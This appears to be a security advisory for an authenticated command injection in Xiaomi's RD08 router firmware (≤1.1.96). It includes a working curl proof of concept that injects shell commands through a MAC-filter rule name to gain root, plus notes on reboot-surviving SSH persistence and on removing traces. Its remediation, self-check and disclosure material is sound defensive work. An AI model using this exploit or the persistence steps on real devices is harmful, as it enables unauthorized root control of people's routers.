# 安全公告：小米路由器 RD08（BE6500 Pro）认证后命令注入 → root

**状态**：已修复（厂商固件 1.1.123）
**公告日期**：2026-11-01
**受影响版本**：≤ 1.1.96（在 1.1.96 上实测）
**修复版本**：1.1.123
**类型**：CWE-78 OS 命令注入（认证后）
**严重性**：高危（需要管理员凭据，影响面为局域网）

---

## English summary

Xiaomi router **RD08 (BE6500 Pro)** firmware **≤ 1.1.96** is vulnerable to an authenticated OS command
injection in the LuCI API `api/xqsystem/set_macfilter_rules`. The `name` parameter (MAC filter rule
name) is interpolated into a shell command without escaping, so an authenticated administrator can
execute arbitrary commands as **root**. Combined with the volatile `/etc` (ramfs) and persistent
`/data`, this allows a reboot-surviving root access path even though the release channel disables the
vendor SSH service. Fixed in firmware **1.1.123**.

---

## 1. 影响

- 攻击者需要**已登录的管理会话**（`stok`）。所以实际风险取决于管理密码强度：
  弱口令、共用密码、ISP 代管、或已被社工/钓鱼拿到密码的场景。
- 拿到 root 后可：
  - 读取/修改设备全部配置与固件分区；
  - 绕过 release 通道对 dropbear 的限制，建立重启后仍存活的 SSH 通道；
  - 在网络层面做持久化（DNS、防火墙、抓包）。
- 仅影响路由器本身，不直接触达内网其他设备；但路由器是内网的可信节点，后续横向影响取决于攻击者。

## 2. 根因

LuCI 接口 `api/xqsystem/set_macfilter_rules` 接收 `mac` / `name` / `option` 三个参数：

```
GET /cgi-bin/luci/;stok=<STOK>/api/xqsystem/set_macfilter_rules
    ?mac=<MAC>&name=<规则名称>&option=0|1
```

其中 `name`（规则名称，正常用户会随手填写）在服务端被拼接进 shell 命令执行，
未做转义、未做字符白名单。当 `name` 含有换行、分号、`$(...)` 等 shell 元字符时，
即可跳出原命令以 `root` 执行任意指令。

## 3. 复现（1.1.96）

前提：有效的管理员会话 `stok`。

1. 登录管理页取得 `stok`；
2. 发送带载荷的规则：

```sh
# name 用 URL 编码后的 shell 片段；这里只是最简形式
curl -s "http://<ROUTER>/cgi-bin/luci/;stok=<STOK>/api/xqsystem/set_macfilter_rules" \
  --data-urlencode 'mac=02:11:22:33:44:55' \
  --data-urlencode 'name=
id > /tmp/poc.out 2>&1' \
  --data-urlencode 'option=0'
# → {"code":0}
```

3. 结果：`/tmp/poc.out` 内容为

```
uid=0(root) gid=0(root)
```

4. 该命令以 root 身份执行，可进一步启动 dropbear（见本仓库 `scripts/`），
   并通过 `/etc/crontabs` 做重启存活。
5. 清理：以同一 MAC 调 `option=1` 删除规则，`/etc/config/macfilter` 不留痕迹。

## 4. 修复

- **升级到 1.1.123 或更高**。1.1.96 及以下均受影响。
- 厂商通过 MiSRC 渠道确认该问题已被处理（本报告提交后按重复处理，原因是已有其他研究者先报）。

## 5. 自查：设备是否已被改过

如果你在 1.1.96 及以下版本上运行过不可信的固件/插件，或怀疑设备被动过，检查：

```sh
# 1) 非标准端口的 dropbear（原厂 release 通道不会启动它）
netstat -ltnp | grep -v ':22 '

# 2) 可疑的 cron 项
cat /etc/crontabs/root

# 3) 可疑的持久化目录
ls -la /data/admin-ssh 2>/dev/null
ls -la /data/etc 2>/dev/null | head

# 4) 临时注入规则的残留（正常应为 0）
grep -c '^config black' /etc/config/macfilter
```

发现异常时：**升级到 1.1.123，然后恢复出厂设置**，再重配。因为 `/data` 上的持久化内容未必随升级清除。

## 6. 时间线

| 日期 | 事件 |
|---|---|
| 2026-11-01 | 在自有设备 1.1.96 上复现，提交 MiSRC |
| 2026-11-01 | MiSRC 按重复关闭（已有其他白帽提交同一问题） |
| 2026-11-01 | 确认 1.1.123 已发布并修复 |

## 7. 附注

- 测试在自有设备、自有内网完成，未影响任何第三方。
- 本仓库的 SSH 通道脚本（`scripts/`）是本公告所述能力的**利用后果**，不是独立漏洞；
  升级到 1.1.123 后，该脚本仍适用于「已具备 root」的设备。
